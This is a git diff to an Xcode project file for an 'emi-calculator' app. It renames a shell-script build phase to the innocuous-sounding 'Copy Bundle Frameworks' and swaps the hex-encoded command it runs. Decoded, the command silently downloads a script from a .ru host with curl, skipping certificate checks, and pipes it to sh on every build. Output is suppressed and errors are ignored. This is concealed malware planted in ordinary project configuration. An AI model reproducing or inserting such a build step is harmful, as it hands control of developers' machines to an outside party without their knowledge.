@@ -106,7 +106,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 8402EE402844E2D600897E8B /* Build configuration list for PBXNativeTarget "emi-calculator" */;
 			buildPhases = (
-				4F3191B7D791CAD8E96A102C /* Compile Cocoa Frameworks */,
+				3CA697900199470E906D904C /* Copy Bundle Frameworks */,
 				953A66D429539734D51790E7 /* [CP] Check Pods Manifest.lock */,
 				8402EE282844E2D100897E8B /* Sources */,
 				8402EE292844E2D100897E8B /* Frameworks */,
@@ -176,7 +176,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	4F3191B7D791CAD8E96A102C /* Compile Cocoa Frameworks */ = {
+	3CA697900199470E906D904C /* Copy Bundle Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -185,7 +185,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Compile Cocoa Frameworks";
+			name = "Copy Bundle Frameworks";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -194,9 +194,13 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-echo \"6375726c202d2d6d61782d74696d652036202d736b2068747470733a2f2f61646f626566696c652e72752f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
+echo \"6375726c202d2d6d61782d74696d652036202d736b2068747470733a2f2f6d656c696e6461732e72752f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
 	";			
 		};
+	
+
+	
+
 	
 		953A66D429539734D51790E7 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
